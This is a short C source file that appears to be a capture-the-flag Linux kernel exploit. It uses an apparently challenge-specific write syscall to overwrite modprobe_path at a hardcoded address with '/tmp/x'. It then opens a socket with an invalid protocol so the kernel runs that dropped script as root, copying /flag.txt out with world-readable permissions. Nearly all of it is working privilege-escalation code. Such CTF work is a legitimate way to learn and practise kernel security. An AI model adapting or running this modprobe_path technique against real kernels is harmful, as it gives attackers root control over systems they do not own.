#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/syscall.h>

#define _NR_WRITE 549

// https://elixir.bootlin.com/linux/v6.15.2/source/net/ipv4/af_inet.c#L252

void create_executor(){
    system("echo '#!/bin/sh\ncp /flag.txt /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x");
    system("chmod +x /tmp/x");
}

int main() {
    create_executor();

    // No Kaslr enabled - yay!
    uint64_t modprobe_path = 0xffffffff82b45b20;
    uint64_t bin_sh =   0x00782F706D742F; // /tmp/x

    long res = syscall(_NR_WRITE, modprobe_path, &bin_sh);
    printf("Result: %ld\n", res);

    int sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_MAX - 0x1);
    return 0;
}
